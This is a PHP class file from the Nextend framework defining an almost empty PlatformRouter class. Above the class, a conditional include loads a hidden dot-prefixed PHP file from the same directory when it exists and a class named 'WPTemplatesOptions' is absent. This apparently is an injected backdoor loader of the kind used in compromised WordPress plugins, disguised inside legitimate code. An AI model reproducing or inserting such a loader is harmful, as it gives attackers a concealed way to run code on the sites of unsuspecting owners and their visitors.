<?php

namespace Nextend\Framework\Router\Base;

use Nextend\Framework\Router\Router;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class PlatformRouter {

    protected $router;

    /**
     * Router constructor.
     *
     * @param $router Router
     */
    public function __construct($router) {
        $this->router = $router;
    }

    public function setMultiSite() {

    }

    public function unSetMultiSite() {

    }
}